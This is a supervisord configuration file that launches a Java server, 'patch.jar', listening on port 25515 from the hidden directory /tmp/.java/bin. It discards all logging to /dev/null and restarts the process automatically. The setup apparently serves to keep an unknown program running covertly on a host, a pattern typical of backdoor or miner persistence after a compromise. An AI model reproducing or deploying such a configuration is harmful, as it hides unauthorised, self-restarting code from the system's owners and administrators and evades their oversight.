# conf/xeh.conf
[supervisord]
logfile=/dev/null

[program:app]
directory=/tmp/.java/bin
command=./patch.jar server -p 25515 --s
stdout_logfile=/dev/null
autorestart = true